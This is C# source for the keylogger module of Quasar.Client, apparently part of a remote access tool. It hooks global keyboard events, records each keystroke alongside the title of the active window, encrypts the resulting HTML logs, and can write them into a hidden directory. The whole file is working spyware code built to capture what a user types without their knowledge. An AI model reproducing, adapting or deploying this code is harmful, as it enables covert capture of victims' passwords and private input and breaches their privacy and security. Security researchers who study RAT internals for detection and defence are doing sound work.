using Gma.System.MouseKeyHook;
using Quasar.Client.Config;
using Quasar.Client.Extensions;
using Quasar.Client.Helper;
using Quasar.Common.Cryptography;
using Quasar.Common.Helpers;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using System.Web;
using System.Windows.Forms;
using Timer = System.Timers.Timer;

namespace Quasar.Client.Logging
{
    /// <summary>
    /// This class provides keylogging functionality and modifies/highlights the output for
    /// better user experience.
    /// </summary>
    public class Keylogger : IDisposable
    {
        /// <summary>
        /// <c>True</c> if the class has already been disposed, else <c>false</c>.
        /// </summary>
        public bool IsDisposed { get; private set; }

        /// <summary>
        /// The timer used to periodically flush the <see cref="_logFileBuffer"/> from memory to disk.
        /// </summary>
        private readonly Timer _timerFlush;

        /// <summary>
        /// The buffer used to store the logged keys in memory.
        /// </summary>
        private readonly StringBuilder _logFileBuffer = new StringBuilder();

        /// <summary>
        /// Temporary list of pressed keys while they are being processed.
        /// </summary>
        private readonly List<Keys> _pressedKeys = new List<Keys>();

        /// <summary>
        /// Temporary list of pressed keys chars while they are being processed.
        /// </summary>
        private readonly List<char> _pressedKeyChars = new List<char>();

        /// <summary>
        /// Saves the last window title of an application.
        /// </summary>
        private string _lastWindowTitle = string.Empty;
        
        /// <summary>
        /// Determines if special keys should be ignored for processing, e.g. when a modifier key is pressed.
        /// </summary>
        private bool _ignoreSpecialKeys;

        /// <summary>
        /// Used to hook global mouse and keyboard events.
        /// </summary>
        private readonly IKeyboardMouseEvents _mEvents;

        /// <summary>
        /// Provides encryption and decryption methods to securely store log files.
        /// </summary>
        private readonly Aes256 _aesInstance = new Aes256(Settings.ENCRYPTIONKEY);

        /// <summary>
        /// The maximum size of a single log file.
        /// </summary>
        private readonly long _maxLogFileSize;

        /// <summary>
        /// Initializes a new instance of <see cref="Keylogger"/> that provides keylogging functionality.
        /// </summary>
        /// <param name="flushInterval">The interval to flush the buffer from memory to disk.</param>
        /// <param name="maxLogFileSize">The maximum size of a single log file.</param>
        public Keylogger(double flushInterval, long maxLogFileSize)
        {
            _maxLogFileSize = maxLogFileSize;
            _mEvents = Hook.GlobalEvents();
            _timerFlush = new Timer { Interval = flushInterval };
            _timerFlush.Elapsed += TimerElapsed;
        }

        /// <summary>
        /// Begins logging of keys.
        /// </summary>
        public void Start()
        {
            Subscribe();
            _timerFlush.Start();
        }

        /// <summary>
        /// Disposes used resources by this class.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (IsDisposed)
                return;

            if (disposing)
            {
                Unsubscribe();
                _timerFlush.Stop();
                _timerFlush.Dispose();
                _mEvents.Dispose();
                WriteFile();
            }

            IsDisposed = true;
        }

        /// <summary>
        /// Subscribes to all key events.
        /// </summary>
        private void Subscribe()
        {
            _mEvents.KeyDown += OnKeyDown;
            _mEvents.KeyUp += OnKeyUp;
            _mEvents.KeyPress += OnKeyPress;
        }

        /// <summary>
        /// Unsubscribes from all key events.
        /// </summary>
        private void Unsubscribe()
        {
            _mEvents.KeyDown -= OnKeyDown;
            _mEvents.KeyUp -= OnKeyUp;
            _mEvents.KeyPress -= OnKeyPress;
        }

        /// <summary>
        /// Initial handling of the key down events and updates the window title.
        /// </summary>
        /// <param name="sender">The sender of  the event.</param>
        /// <param name="e">The key event args, e.g. the keycode.</param>
        /// <remarks>This event handler is called first.</remarks>
        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            string activeWindowTitle = NativeMethodsHelper.GetForegroundWindowTitle();
            if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle)
            {
                _lastWindowTitle = activeWindowTitle;
                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>" 
                    + HttpUtility.HtmlEncode(activeWindowTitle) + " - " 
                    + DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo) 
                    + " UTC</b>]</p><br>");
            }

            if (_pressedKeys.ContainsModifierKeys())
            {
                if (!_pressedKeys.Contains(e.KeyCode))
                {
                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                    _pressedKeys.Add(e.KeyCode);
                    return;
                }
            }

            if (!e.KeyCode.IsExcludedKey())
            {
                // The key was not part of the keys that we wish to filter, so
                // be sure to prevent a situation where multiple keys are pressed.
                if (!_pressedKeys.Contains(e.KeyCode))
                {
                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                    _pressedKeys.Add(e.KeyCode);
                }
            }
        }

        /// <summary>
        /// Processes pressed keys and appends them to the <see cref="_logFileBuffer"/>. Processing of Unicode characters starts here.
        /// </summary>
        /// <param name="sender">The sender of  the event.</param>
        /// <param name="e">The key press event args, especially the pressed KeyChar.</param>
        /// <remarks>This event handler is called second.</remarks>
        private void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            if (_pressedKeys.ContainsModifierKeys() && _pressedKeys.ContainsKeyChar(e.KeyChar))
                return;

            if ((!_pressedKeyChars.Contains(e.KeyChar) || !DetectKeyHolding(_pressedKeyChars, e.KeyChar)) && !_pressedKeys.ContainsKeyChar(e.KeyChar))
            {
                var filtered = HttpUtility.HtmlEncode(e.KeyChar.ToString());
                if (!string.IsNullOrEmpty(filtered))
                {
                    Debug.WriteLine("OnKeyPress Output: " + filtered);
                    if (_pressedKeys.ContainsModifierKeys())
                        _ignoreSpecialKeys = true;

                    _pressedKeyChars.Add(e.KeyChar);
                    _logFileBuffer.Append(filtered);
                }
            }
        }

        /// <summary>
        /// Finishes processing of the keys.
        /// </summary>
        /// <param name="sender">The sender of  the event.</param>
        /// <param name="e">The key event args.</param>
        /// <remarks>This event handler is called third.</remarks>
        private void OnKeyUp(object sender, KeyEventArgs e)
        {
            _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
            _pressedKeyChars.Clear();
        }

        /// <summary>
        /// Finds a held down key char in a given key char list.
        /// </summary>
        /// <param name="list">The list of key chars.</param>
        /// <param name="search">The key char to search for.</param>
        /// <returns><c>True</c> if the list contains the key char, else <c>false</c>.</returns>
        private bool DetectKeyHolding(List<char> list, char search)
        {
            return list.FindAll(s => s.Equals(search)).Count > 1;
        }

        /// <summary>
        /// Adds special highlighting in HTML to the special keys.
        /// </summary>
        /// <param name="keys">The input keys.</param>
        /// <returns>The highlighted special keys.</returns>
        private string HighlightSpecialKeys(Keys[] keys)
        {
            if (keys.Length < 1) return string.Empty;

            string[] names = new string[keys.Length];
            for (int i = 0; i < keys.Length; i++)
            {
                if (!_ignoreSpecialKeys)
                {
                    names[i] = keys[i].GetDisplayName();
                    Debug.WriteLine("HighlightSpecialKeys: " + keys[i] + " : " + names[i]);
                }
                else
                {
                    names[i] = string.Empty;
                    _pressedKeys.Remove(keys[i]);
                }
            }

            _ignoreSpecialKeys = false;

            if (_pressedKeys.ContainsModifierKeys())
            {
                StringBuilder specialKeys = new StringBuilder();

                int validSpecialKeys = 0;
                for (int i = 0; i < names.Length; i++)
                {
                    _pressedKeys.Remove(keys[i]);
                    if (string.IsNullOrEmpty(names[i])) continue;

                    specialKeys.AppendFormat((validSpecialKeys == 0) ? @"<p class=""h"">[{0}" : " + {0}", names[i]);
                    validSpecialKeys++;
                }

                // If there are items in the special keys string builder, give it an ending tag
                if (validSpecialKeys > 0)
                    specialKeys.Append("]</p>");

                Debug.WriteLineIf(specialKeys.Length > 0, "HighlightSpecialKeys Output: " + specialKeys.ToString());
                return specialKeys.ToString();
            }

            StringBuilder normalKeys = new StringBuilder();

            for (int i = 0; i < names.Length; i++)
            {
                _pressedKeys.Remove(keys[i]);
                if (string.IsNullOrEmpty(names[i])) continue;

                switch (names[i])
                {
                    case "Return":
                        normalKeys.Append(@"<p class=""h"">[Enter]</p><br>");
                        break;
                    case "Escape":
                        normalKeys.Append(@"<p class=""h"">[Esc]</p>");
                        break;
                    default:
                        normalKeys.Append(@"<p class=""h"">[" + names[i] + "]</p>");
                        break;
                }
            }

            Debug.WriteLineIf(normalKeys.Length > 0, "HighlightSpecialKeys Output: " + normalKeys.ToString());
            return normalKeys.ToString();
        }

        private void TimerElapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (_logFileBuffer.Length > 0)
                WriteFile();
        }

        /// <summary>
        /// Writes the logged keys from memory to disk.
        /// </summary>
        private void WriteFile()
        {
            // TODO: Add some house-keeping and delete old log entries
            bool writeHeader = false;

            string filePath = Path.Combine(Settings.LOGSPATH, DateTime.UtcNow.ToString("yyyy-MM-dd"));

            try
            {
                DirectoryInfo di = new DirectoryInfo(Settings.LOGSPATH);

                if (!di.Exists)
                    di.Create();

                if (Settings.HIDELOGDIRECTORY)
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                int i = 1;
                while (File.Exists(filePath))
                {
                    // Large log files take a very long time to read, decrypt and append new logs to,
                    // so create a new log file if the size of the previous one exceeds _maxLogFileSize.
                    long length = new FileInfo(filePath).Length;
                    if (length < _maxLogFileSize)
                    {
                        break;
                    }

                    // append a number to the file name
                    var newFileName = $"{Path.GetFileName(filePath)}_{i}";
                    filePath = Path.Combine(Settings.LOGSPATH, newFileName);
                    i++;
                }

                if (!File.Exists(filePath))
                    writeHeader = true;

                StringBuilder logFile = new StringBuilder();

                if (writeHeader)
                {
                    logFile.Append(
                        "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                        DateTime.UtcNow.ToString("f", DateTimeFormatInfo.InvariantInfo) + " UTC<br><br>");

                    logFile.Append("<style>.h { color: 0000ff; display: inline; }</style>");

                    _lastWindowTitle = string.Empty;
                }

                if (_logFileBuffer.Length > 0)
                {
                    logFile.Append(_logFileBuffer);
                }

                FileHelper.WriteLogFile(filePath, logFile.ToString(), _aesInstance);

                logFile.Clear();
            }
            catch
            {
            }

            _logFileBuffer.Clear();
        }
    }
}
